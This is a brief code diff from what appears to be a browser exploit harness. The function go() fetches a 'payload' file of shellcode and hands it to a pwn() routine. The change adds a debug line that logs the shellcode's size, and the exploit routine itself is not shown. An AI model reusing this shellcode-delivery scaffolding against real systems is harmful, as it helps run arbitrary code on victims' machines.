@@ -424,6 +424,7 @@ function print_error(e) {
 function go() {
     fetch('payload').then((response) => {
         response.arrayBuffer().then((buffer) => {
+            print(`got ${buffer.byteLength} bytes of shc`)
             try {
                 pwn(new Uint8Array(buffer));
             } catch (e) {
